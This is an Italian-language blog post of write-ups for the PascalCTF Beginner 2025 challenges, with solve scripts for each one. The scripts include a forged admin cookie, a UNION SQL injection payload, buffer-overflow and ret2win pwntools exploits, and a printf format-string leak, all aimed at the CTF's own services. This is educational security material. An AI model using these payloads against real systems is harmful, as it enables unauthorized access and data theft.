---
title: "Pascal CTF Beginner 2025"
date: 2025-03-26T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["pascalCTF", "ctf", "binary", "crypto", "web", "pascalCTF2025"]
author: "AlBovo"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Alcune writeups della pascalCTF Beginner ctf 2025."
canonicalURL: "https://albovo.github.io/it/ctf/"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups" # image path/url
    alt: "Pascal CTF Beginner 2025" # alt text
    caption: "Alcune writeups della pascalCTF Beginner ctf 2025." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/AlBovo/AlBovo.github.io/blob/main/content/it"
    Text: "Suggerisci modifiche" # edit text
    appendFilePath: true # to append file path to Edit link
---

# Pascal CTF Beginner 2025
![pascalCTF logo](/images/pascalCTF.png)

## Web 🌐
### Static Fl@g
Questa challenge è una delle più semplici nel contesto della sicurezza web, in quanto si basa su un controllo lato client per rivelare la flag. La flag è incorporata nel codice JavaScript della pagina index, codificata in base64, il che la rende facilmente individuabile tramite ispezione del codice.
Di conseguenza, non è necessario scrivere uno script per risolvere questa challenge.

### Biscotto
Il backend di Biscotto contiene solo due endpoint:  

- **`/login`**: permette agli utenti di effettuare l'accesso, a meno che il nome utente non sia "admin".  
- **`/me`**: mostra la flag se l'utente è "admin".

![codice js del server](/images/biscottoCode.png)

La flag può quindi essere trovata con questo comando:
```sh
#!/bin/sh
curl --cookie "user=admin" https://biscotto.challs.pascalctf.it/me
```

La vulnerabilità si trova nella funzione **me**, dove il cookie di sessione, non crittografato, viene utilizzato per verificare il nome utente.
Per ottenere la flag, basta modificare il cookie **user**, impostandolo su admin, e accedere all'endpoint per visualizzare la flag.

### Euro2024
La challenge riguarda un'applicazione web che fornisce statistiche per diversi gruppi partecipanti a un torneo. L'obiettivo è sfruttare una vulnerabilità di **SQL Injection** per estrarre la flag.

La soluzione proposta utilizza un attacco di **SQL Injection** per recuperare la flag dal database. Di seguito è riportata l'analisi dell'approccio:

#### 1. Understanding the Vulnerability
L'endpoint `/api/group-stats` sembra essere vulnerabile a SQL Injection. Il parametro di input `group` viene inserito direttamente in una query SQL senza una corretta sanitizzazione.

#### 2. Crafting the Payload
Il payload utilizzato per sfruttare la vulnerabilità è:

```sql
' UNION SELECT flag, null, null, null, null, null, null, null FROM FLAG; -- -
```

Di seguito sono elencati i vari passaggi del payload:
- Esce dal contesto della query esistente utilizzando `' UNION SELECT`.
- Seleziona la colonna `flag` dalla tabella `FLAG`.
- Utilizza valori `null` per corrispondere al numero previsto di colonne.
- Commenta il resto della query SQL per prevenire errori di sintassi.

Questo è il codice effettivamente utilizzato anche dal checker:
```python
#!/usr/bin/env python3
import requests
URL = 'http://localhost:8002'
PAYLOAD = "' UNION SELECT flag" + ", null" * 7 + " FROM FLAG; -- -"

r = requests.post(URL + '/api/group-stats', data={'group' : PAYLOAD})
print(r.json()['data'][0]['group_id'])```
```

## Cryptography 🔒
### Romañs Empyre
Questa challenge `"cripta"` la flag in modo molto semplice, scegliendo **casualmente** una chiave utilizzata per codificare la flag tramite il [`Cifrario di Cesare`](https://it.wikipedia.org/wiki/Cifrario_di_Cesare).  
Il risultato di questa cifratura si trova in `output.txt` e può essere decifrato utilizzando [`cyberchef.org`](https://gchq.github.io/CyberChef/) oppure tramite il writeup Python allegato a questa challenge.

```py
#!/usr/bin/env python3
import string
alphabet = string.ascii_letters + string.digits + "{}_-.,/%?$!@#"

def romanize(input_string):
    for key in range(1, len(alphabet)):
        result = [""] * len(input_string)
        for i, c in enumerate(input_string):
            result[i] = alphabet[(alphabet.index(c) + key) % len(alphabet)]
        result = "".join(result)

        if "pascalCTF{" in result:
            return result

if __name__ == "__main__":
    enc_flag = open("output.txt", "r").read().strip()
    print(romanize(enc_flag))
```

### MindBlowing
Questa challenge offre un servizio che calcola l'**AND bitwise** tra una stringa (probabilmente la flag) e una serie di interi forniti dall'utente. Per rendere tutto più interessante, ogni intero non può avere più di *40 bit impostati a 1*.  
Una volta completati i calcoli, la challenge restituisce un array di risultati.<br>

Esistono diverse strategie per risolvere questa challenge. Un approccio consiste nell'inviare circa **15 interi**, ognuno con 40 bit consecutivi impostati a 1, e progressivamente *shiftati a destra* di `40 * x`, dove `x` è l'indice dell'intero. Successivamente, è possibile recuperare la flag calcolando l'*OR bitwise* dell'array dei risultati e convertendo l'intero risultante in byte (in ordine *big-endian*, ovviamente).

```py
#!/usr/bin/env python3
from Crypto.Util.number import *
from pwn import *

# connect to the server
r = remote('0.0.0.0', 420)

# Bypass menu questions
r.recvuntil(b'> ')
r.sendline(b'1')
r.recvuntil(b': ')
r.sendline(b'2')
r.recvuntil(b': ')
r.sendline(b'15') # 40 * 10

# send masks to get 40 bits of the flag at a time
for _ in range(15):
    r.recvuntil(b': ')
    r.sendline(str(((1 << 40) - 1) << (40 * _)).encode())

flag = 0
# get the flag
r.recvuntil(b'[')
for _ in range(15):
    flag |= int(r.recvuntil(b',')[:-1].decode())

# print the flag
print(long_to_bytes(flag).decode())
```

### My favourite number
Questa challenge fornisce un file di output, che contiene una conversazione tra Alice e Bob **criptata con RSA**, dove Bob indovina il numero preferito di Alice, eseguendo una ricerca binaria. Per ogni messaggio, Alice risponde con una risposta sì o no alla domanda "Il tuo numero è maggiore di X?", fino a quando non viene trovato il numero corretto, che è `long_to_bytes()` della flag.

Il concetto chiave è che possiamo criptare, utilizzando la chiave pubblica di Bob, il messaggio che Alice invierebbe per entrambi i casi affermativi e negativi, e verificare quale corrisponde, seguendo l'intera conversazione e scoprendo il valore.

```py
#!/usr/bin/env python3
from Crypto.Util.number import getPrime,bytes_to_long,long_to_bytes

f=open("output.txt","r")

n= #bob_n
e=65537

def sendToBob(msg):
    pt=bytes_to_long(msg.encode())
    ct=pow(pt,e,n)
    return f"alice: {ct}"

#skip first messages
for i in range(7):
    f.readline()

upperbound=2**501
lowerbound=0
while(upperbound-lowerbound>1):
    mid=(upperbound+lowerbound)//2
    f.readline()
    response=f.readline()
    if(response.strip()==sendToBob(f"Yes!, my number is greater than {mid}")):
        lowerbound=mid
    else:
        upperbound=mid

#print the flag
print(long_to_bytes(upperbound).decode())
```

## Binary Exploitation 💻
### Morris Worm
Questa challenge legge 1337 caratteri da **stdin** e li memorizza in un **array di char**, quindi verifica se una variabile è uguale a 1337 e, in caso affermativo, otteniamo la flag. Il problema è che il valore della variabile è 69 e non cambia.  
L'array di char, tuttavia, è lungo solo **44 byte** e possiamo scrivere più di questo, quindi è vulnerabile a un **buffer overflow**. Dobbiamo semplicemente riempire l'array e poi inserire 1337 usando [p32](https://docs.pwntools.com/en/stable/util/packing.html) per **sovrascrivere correttamente la variabile**.  
È anche possibile sfruttare la challenge utilizzando un attacco ret2win, sfruttando la vulnerabilità del buffer overflow e l'assenza di PIE (Position Independent Executable) nel binario.

```py
#!/usr/bin/env python3
from pwn import *

# Change this to remote if you want to run it on remote server
if args.REMOTE:
    r = remote('localhost', 1337) # change host and port
else:
    r = process('./pwn1')

PAYLOAD = b'A' * 44 + p32(1337)
r.recvuntil(b'?\n')
r.sendline(PAYLOAD + b'\x00')

r.interactive()
```

### Unpwnable Shop
Questa challenge ci permette di **inserire il nostro nome** per accedere al negozio. Guardando attentamente, possiamo vedere che il **limite** del nostro input è posizionato subito dopo il nostro nome nello **stack** e anche il suo valore iniziale è 81! Giusto abbastanza per inserire il nostro nome e **sovrascrivere il limite** per un uso successivo.  
Dopo aver inserito il nostro nome, il programma ci chiede cosa vogliamo fare; se rispondiamo 69, accediamo a un dialogo unico che ci fa **reinserire il nostro nome**, ma questa volta il limite è quello che abbiamo inserito precedentemente.  
Quindi, se inviamo 88 byte (76 per il nome utente, 4 per il limite e 8 per il rbp), e l'**indirizzo della funzione 'win'**, sovrascriviamo correttamente l'indirizzo di ritorno e otteniamo la flag.

**Vulnerabilità**: [ret2win](https://book.hacktricks.xyz/binary-exploitation/stack-overflow/ret2win)

```py
#!/usr/bin/env python3
from pwn import remote, args, ELF, p64, p32

elf = ELF("./unpwnable")
if args.REMOTE:
    r = remote('localhost', 1338) #Change host and port
else:
    r = elf.process()

# Overwriting limit
r.recvuntil(b':')
r.sendline(b'a' * 76 + p32(96))

# Sending right choice
r.recvuntil(b'stuff')
r.sendline(b'69')

#Overwriting return address
r.recvuntil(b'it.')
r.sendline(b'a'*88 + p64(elf.sym['win']))
r.recvuntil(b'Bye!\n')

#Flag!
r.interactive()
```

### E.L.I.A
Questa challenge legge prima la flag dal file `flag.txt` e la salva nello **stack**. Poi, richiede un input dall'utente e successivamente lo stampa in modo insicuro usando `printf` senza alcun **formato definito**.

Questo eseguibile può quindi essere sfruttato se vengono trovati e utilizzati i corretti offset nello stack della flag (da 8 a 13) insieme a `%p` nel formato `%x$p`, dove *x* è l'offset.

```py
#!/usr/bin/env python3
from pwn import args, remote, process

# Change this to remote if you want to run it on remote server
if args.REMOTE:
    r = remote('localhost', 1339) # change host and port
else:
    r = process('./elia')

r.recvuntil(b'?\n')
PAYLOAD = b''
for i in range(8, 13):
    PAYLOAD += f'%{i}$p'.encode()

r.sendline(PAYLOAD)
flag = [int(i, 16) for i in r.recvline().decode().split('0x')[1:]]
pascal = ''
for i in flag:
    pascal += i.to_bytes(8, 'little').decode()

pascal = pascal.replace('\x00', '')
print(pascal)
```

## Reverse Engineering ⚙️
### X-Ray
Questa challenge legge una "*licenza*" e poi verifica se è valida.  
Il problema principale qui è che la cifratura della licenza è stata fatta utilizzando **XOR**, quindi può essere decrittata nel seguente modo.

```py
#!/usr/bin/env python3
def xor(a, b):
    return bytes([x ^ y for x, y in zip(a, b)])

KEY = "*7^tVr4FZ#7S4RFNd2"
ENC = "xR\x08G$G\x07\x19kPhgCa5~\t\x01"

flag = xor(KEY.encode(), ENC.encode()).decode()
print(f"pascalCTF{{{flag}}}")
```

### Switcharoo
Questa challenge coinvolge un semplice controllo della flag utilizzando una struttura switch-case. Sebbene il compito non sia particolarmente difficile, richiede comunque di fare il reverse del codice per determinare l'indice corretto per ogni carattere specifico. Questo può essere ottenuto analizzando il codice decompilato utilizzando strumenti come IDA o Ghidra.

![il codice decompilato](/images/switcharoo.png)

P.S.: Personalmente mi dispiace per chi ha effettivamente sprecato tempo cercando di risolvere questa challenge (grazie comunque per l'impegno).

```py
#!/usr/bin/env python3
flag = ['']*32

flag[1] = flag[4] = flag[11] = 'a'
flag[7] = flag[19] = 'T'
flag[17] = '4'
flag[24] = 'r'
flag[18] = 'n'
flag[3] = flag[16] = 'c'
flag[5] = flag[28] = 'l'
flag[0] = flag[10] = 'p'
flag[2] = 's'
flag[6] = 'C'
flag[21] = 'D'
flag[14] = 'o'
flag[8] = 'F'
flag[13] = flag[30] = 'L'
flag[26] = 'V'
flag[12] = flag[29] = flag[22] = '0'
flag[9] = '{'
flag[118 ^ 0x69] = '}'
flag[15] = flag[20] = flag[23] = flag[27] = '_'
flag[25] = '3'

print(''.join(flag))
```

### KONtAct MI	
Questa challenge ci permette di giocare a un gioco su un gameboy e raccogliere oggetti collezionabili.  
Ogni volta che un oggetto collezionabile viene raccolto, una parte di un codice viene aggiunta al nostro codice attuale; questo codice, poi, può essere inviato a un admin tramite una richiesta POST affinché venga valutato.

![](/images/kontactmi.png)

L'endpoint dove viene inviato il codice supporta non solo le richieste POST, ma anche le richieste GET.  
Quindi, se facciamo una richiesta GET allo stesso endpoint, risponde con il codice corretto.  
Possiamo quindi inviare il codice corretto per ottenere la flag.

```python
import requests

code = requests.get(f"https://kontactmi.challs.pascalctf.it/adminSupport").json()['response']

flag = requests.post(f"https://kontactmi.challs.pascalctf.it/adminSupport", json={"code":code}).text
print(flag)
```

## Miscellaneous 🧭
### Base N' Hex
Questa sfida `"cripta"` la flag in un modo molto semplice, **scegliendo casualmente** se codificare la flag in *base64* o *esadecimale* per **10 volte**. Il risultato di questa cifratura può essere trovato in `output.txt` e può essere decriptato utilizzando [`cyberchef.org`](https://gchq.github.io/CyberChef/) o tramite il codice Python allegato a questa sfida.

```py
#!/usr/bin/env python3
from base64 import b64decode
flag = open("output.txt", "rb").read()

for i in range(10):
    try:
        if b64decode(flag).isascii():
            flag = b64decode(flag)
        else:
            raise Exception
    except:
        flag = bytes.fromhex(flag.decode())
print(flag.decode())
```

### Romagnol Prometheus
Questa sfida include tre immagini che rappresentano tre località italiane che possono essere identificate utilizzando le **coordinate GPS** salvate all'interno dei [metadati](https://it.wikipedia.org/wiki/Metadati) delle immagini. Insieme a queste coordinate, ci sono anche **commenti** che specificano il tipo di bomba nucleare che *Mattia* ha deciso di sganciare su quella località. L'obiettivo della sfida è scoprire la località **bombardata da tutti e tre i dispositivi**.

Quindi, il primo passo per risolvere la sfida è estrarre dei dati dalle immagini per comprendere meglio i prossimi passaggi.

* Risultato dell'analisi della prima immagine
![](/images/pascalCTFimage1.png)

* Risultato dell'analisi della seconda immagine
![](/images/pascalCTFimage2.png)

* Risultato dell'analisi della terza immagine
![](/images/pascalCTFimage3.png)


| Immagine | Coordinate                         | Bomba             |
|:--------:|------------------------------------|-------------------|
|     1    | 42° 51' 16.74" N, 13° 28' 36.58" E | TSAR 100MT        |
|     2    | 43° 11' 43.22" N, 12° 12' 56.08" E | Castle Bravo 15MT |
|     3    | 44° 8' 28.83" N, 12° 14' 24.84" E  | TSAR 100MT        |

Una volta identificate le coordinate delle aree da bombardare, basta utilizzare [`NukeMap`](https://nuclearsecrecy.com/nukemap/) per notare che il raggio d'esplosione delle varie bombe atomiche coincide con la sfortunata città di Gubbio. Pertanto, questo nome deve essere inserito nel formato `pascalCTF{}` per ottenere la flag richiesta, cioè `pascalCTF{gubbio}`.

![risultato del bombardamento](/images/bomb.png)


### DNS e pancetta
Questa sfida, come si può dedurre dal suo nome, coinvolge il [DNS Beaconing](https://medium.com/@letshackit/dns-beaconing-definition-and-detection-6a12f975f35e), una tecnica utilizzata da malware e attaccanti per *esfiltrare* dati e inviarli al loro server tramite **richieste DNS**.
![screenshot di wireshark](/images/dnsPancetta.png)

Per risolvere questa sfida, è stato necessario dividere ogni dominio richiesto dal DNS utilizzando il carattere `.` ed estrarre la prima parte esadecimale. Una volta che tutte le parti sono state concatenate in *ordine cronologico*, la flag può essere ottenuta semplicemente convertendo il testo esadecimale in ASCII.

```py
import pyshark, re

capture = pyshark.FileCapture('misc3.pcapng', display_filter='dns.a') # open file and get all requests
regex = r'pascalCTF{.*?}' # regex to match flag format

flag = ''
for packet in capture:
    query : str = packet.dns.qry_name
    if len(data := query.split('.')) == 3:
        flag += data[0]

flag = bytes.fromhex(flag).decode('utf-8') # convert hex to ascii
print(re.findall(regex, flag)[0]) # print the flag
```